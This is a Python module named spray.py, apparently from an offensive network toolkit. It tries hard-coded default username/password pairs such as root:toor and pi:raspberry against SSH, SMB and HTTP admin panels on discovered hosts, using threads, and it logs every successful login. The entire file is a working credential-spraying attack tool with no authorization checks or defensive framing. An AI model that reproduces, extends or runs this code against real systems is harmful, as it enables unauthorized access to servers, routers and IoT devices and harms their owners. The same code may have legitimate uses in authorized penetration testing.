"""
spray.py — Default credential spray over SSH, SMB, HTTP admin panels
"""

import socket, threading, time
from . import tui

# ── default credential lists ──────────────────────────────────────────────────
DEFAULT_CREDS = [
    ("admin",        "admin"),
    ("admin",        "password"),
    ("admin",        ""),
    ("admin",        "1234"),
    ("admin",        "123456"),
    ("root",         "root"),
    ("root",         "toor"),
    ("root",         ""),
    ("root",         "password"),
    ("administrator","admin"),
    ("administrator","password"),
    ("administrator",""),
    ("user",         "user"),
    ("guest",        "guest"),
    ("cisco",        "cisco"),
    ("pi",           "raspberry"),
    ("ubnt",         "ubnt"),
    ("support",      "support"),
    ("service",      "service"),
]

HTTP_ADMIN_PATHS = [
    "/",
    "/admin",
    "/login",
    "/manager/html",    # Tomcat
    "/web",
    "/cgi-bin/luci",    # OpenWRT
]

HTTP_ADMIN_PORTS = [80, 8080, 8443, 443, 8888, 8000]
SSH_PORT         = 22
SMB_PORT         = 445


# ── SSH spray ─────────────────────────────────────────────────────────────────
def _try_ssh(ip, user, password, timeout=4):
    try:
        import paramiko
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(ip, port=SSH_PORT, username=user, password=password,
                  timeout=timeout, allow_agent=False, look_for_keys=False)
        c.close()
        return True
    except Exception:
        return False


def _spray_ssh(hosts, creds, results, verbose):
    ssh_hosts = [h for h in hosts if SSH_PORT in (h.get("ports") or [])]
    for h in ssh_hosts:
        ip = h["ip"]
        for user, pwd in creds:
            if verbose:
                tui.info(f"SSH  {ip}  {user}:{pwd}")
            if _try_ssh(ip, user, pwd):
                entry = {"target": ip, "service": "ssh", "user": user, "secret": pwd}
                results.append(entry)
                tui.success(f"SSH login: {tui.YLW}{ip}{tui.R}  {user}:{pwd}")
                break           # found cred for this host
            time.sleep(0.1)


# ── SMB spray ─────────────────────────────────────────────────────────────────
def _try_smb(ip, user, password, domain="WORKGROUP", timeout=4):
    try:
        import impacket.smbconnection as smb
        conn = smb.SMBConnection(ip, ip, timeout=timeout)
        conn.login(user, password, domain)
        conn.logoff()
        return True
    except Exception:
        return False


def _spray_smb(hosts, creds, results, verbose):
    smb_hosts = [h for h in hosts if SMB_PORT in (h.get("ports") or [])]
    for h in smb_hosts:
        ip = h["ip"]
        for user, pwd in creds:
            if verbose:
                tui.info(f"SMB  {ip}  {user}:{pwd}")
            if _try_smb(ip, user, pwd):
                entry = {"target": ip, "service": "smb", "user": user, "secret": pwd}
                results.append(entry)
                tui.success(f"SMB login: {tui.YLW}{ip}{tui.R}  {user}:{pwd}")
                break
            time.sleep(0.1)


# ── HTTP basic-auth spray ─────────────────────────────────────────────────────
def _try_http(ip, port, path, user, password, timeout=4):
    try:
        import requests
        from requests.auth import HTTPBasicAuth, HTTPDigestAuth
        url = f"{'https' if port == 443 else 'http'}://{ip}:{port}{path}"
        for Auth in (HTTPBasicAuth, HTTPDigestAuth):
            r = requests.get(url, auth=Auth(user, password),
                             timeout=timeout, verify=False,
                             allow_redirects=True)
            if r.status_code not in (401, 403, 404):
                return True
        return False
    except Exception:
        return False


def _spray_http(hosts, creds, results, verbose):
    for h in hosts:
        ip    = h["ip"]
        ports = [p for p in (h.get("ports") or []) if p in HTTP_ADMIN_PORTS]
        for port in ports:
            for path in HTTP_ADMIN_PATHS:
                for user, pwd in creds:
                    if verbose:
                        tui.info(f"HTTP {ip}:{port}{path}  {user}:{pwd}")
                    if _try_http(ip, port, path, user, pwd):
                        entry = {"target": f"{ip}:{port}{path}",
                                 "service": "http", "user": user, "secret": pwd}
                        results.append(entry)
                        tui.success(f"HTTP login: {tui.YLW}{ip}:{port}{path}{tui.R}  {user}:{pwd}")
                        break
                    time.sleep(0.05)


# ── orchestrator ──────────────────────────────────────────────────────────────
def spray(hosts: list[dict], services=("ssh", "smb", "http"),
          creds=None, verbose=False) -> list[dict]:
    """
    Spray default creds across discovered hosts.
    Returns list of successful { target, service, user, secret }.
    """
    if creds is None:
        creds = DEFAULT_CREDS

    results = []
    threads = []

    if "ssh" in services:
        t = threading.Thread(target=_spray_ssh,
                             args=(hosts, creds, results, verbose), daemon=True)
        threads.append(t)

    if "smb" in services:
        t = threading.Thread(target=_spray_smb,
                             args=(hosts, creds, results, verbose), daemon=True)
        threads.append(t)

    if "http" in services:
        t = threading.Thread(target=_spray_http,
                             args=(hosts, creds, results, verbose), daemon=True)
        threads.append(t)

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    return results
